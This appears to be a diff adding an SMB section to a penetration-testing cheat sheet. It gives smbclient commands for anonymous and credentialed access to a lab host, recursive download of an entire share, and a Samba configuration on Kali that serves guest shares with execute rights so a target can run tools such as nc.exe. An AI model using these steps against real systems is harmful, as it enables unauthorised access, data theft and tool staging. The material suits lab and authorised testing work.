@@ -282,6 +282,91 @@ net use X: /delete
 net use X: \\<your_kali_ip>\EVILSHARE /user:[user] [password]
 ```
 
+### On Linux
+
+```bash
+# smbclient
+smbclient -U 'username'%'password' //10.10.10.130/sharename
+smbclient -U ''%'' //10.10.10.130/sharename
+smbclient -U anonymous //10.10.10.130/sharename
+
+## list shares
+smbclient -U 'username'%'password' -L //10.10.10.130
+
+## download
+smb> get somefile.txt
+
+## upload
+smb> put /tmp/somefile.txt
+
+## download everything in share
+> mask ""
+> recurse ON
+> prompt OFF
+> mget *
+```
+
+You can also mount an SMB share:
+```bash
+# regular smb mount
+mount -t cifs -o username=user_name //server_name/share_name /mnt/
+
+# smb3 encrypted connection
+mount -t cifs -o username=DOMAIN\Administrator,seal,vers=3.0 //server/example 
+```
+
+### Using the Samba Service on Kali
+
+Sometimes impacket's `smbserver.py` fails to do the job, most often if newer SMB dialects are required. In that case you can use the samba service that comes pre-installed on Kali Linux.
+
+Edit your `smb.conf` and add your new share:
+
+```bash
+sudo nano /etc/samba/smb.conf
+```
+```default
+[myshare]
+   path = /home/kali/_share
+   browseable = yes
+   read only = yes
+   guest ok = yes
+   acl allow execute always = True
+```
+
+The above will create a read-only share using the specified path as directory base. The last line allows the remote host to execute binaries stored in the share (like nc.exe for example), which can come in handy if you cannot find a writable directory on the target machine.
+
+If you want the remote host to be able to write to the share then use this instead:
+
+```default
+[myshare]
+   path = /home/kali/_share
+   browseable = yes
+   writable = yes
+   read only = no
+   guest ok = yes
+   acl allow execute always = True
+```
+
+You will need to (re)start the smbd service for this change to take effect:
+```bash
+sudo /etc/init.d/smbd restart
+```
+
+Using `netstat -tulpn` you can confirm that ports 139 and 445 should be open and listening now. 
+
+You can also check the available shares with the `smbclient -L //127.0.0.1` command. Or connect directly to your new share with: `smbclient //127.0.0.1/myshare`
+
+You can turn the SMB server on and off like this:
+
+```default
+sudo /etc/init.d/smbd start
+sudo /etc/init.d/smbd stop
+
+sudo /etc/init.d/smbd restart
+```
+
+You probably want to turn it off once you don't need it anymore.
+
 
 ## Netcat
 
